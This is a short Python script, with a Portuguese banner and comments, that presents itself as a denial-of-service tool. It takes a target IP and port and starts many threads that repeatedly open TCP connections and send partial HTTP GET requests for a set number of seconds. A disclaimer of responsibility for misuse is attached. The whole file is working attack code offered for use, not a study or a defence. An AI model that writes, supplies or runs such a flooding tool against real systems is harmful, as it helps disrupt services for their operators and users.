import socket
import threading
import argparse
import time

# Autor: SrJare337
# Ferramenta de DoS – Não me responsabilizo por seus usos!

def banner():
    print("""
    ##################################################
    #               [+]Ferramenta de DoS[+]          #
    #                 Desenvolvido por               #
    #                  SrJare337💻🔒                #
    #                                                #
    #    Aviso: Não me responsabilizo por qualquer   #
    #          uso indevido desta ferramenta.        #
    ##################################################
    """)

def parse_args():
    parser = argparse.ArgumentParser(description="[+]Ferramenta de ataques DoS![+]")
    parser.add_argument("target_ip", help="[+]IP do alvo[+]")
    parser.add_argument("target_port", type=int, help="[+]Porta do alvo[+]")
    parser.add_argument("--threads", type=int, default=100, help="[+]Número de threads para o ataque[+]")
    parser.add_argument("--duration", type=int, default=60, help="[+]Duração do ataque em segundos[+]")
    parser.add_argument("--timeout", type=int, default=5, help="[+]Tempo limite para cada conexão em segundos[+]")
    return parser.parse_args()

def is_valid_ip(ip):
    
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def attack(target_ip, target_port, timeout):
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)  # Define um tempo limite para a conexão
                s.connect((target_ip, target_port))
                s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
                s.sendto(b"Host: " + bytes(target_ip, 'utf-8') + b"\r\n\r\n", (target_ip, target_port))
        except socket.error as e:
            break  # Encerra o loop em caso de erro

def start_attack(target_ip, target_port, num_threads, duration, timeout):
    threads = []
    print(f"[+]SrJare337[+] fazendo ataque DoS em {target_ip}:{target_port} com {num_threads} threads por {duration} segundos")
    
    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(target_ip, target_port, timeout))
        thread.daemon = True  # Permite que o thread seja encerrado quando o programa principal terminar
        thread.start()
        threads.append(thread)

    time.sleep(duration)

    # Encerra todas as threads após o tempo especificado
    for thread in threads:
        thread.join(timeout)
        if thread.is_alive():
            print(f"Thread {thread.name} ainda está ativa. Forçando encerramento.")

    print("Ataque concluído.")

def main():
    banner()
    args = parse_args()

    if not is_valid_ip(args.target_ip):
        print(f"IP inválido: {args.target_ip}")
        return

    start_attack(args.target_ip, args.target_port, args.threads, args.duration, args.timeout)

if __name__ == "__main__":
    main()
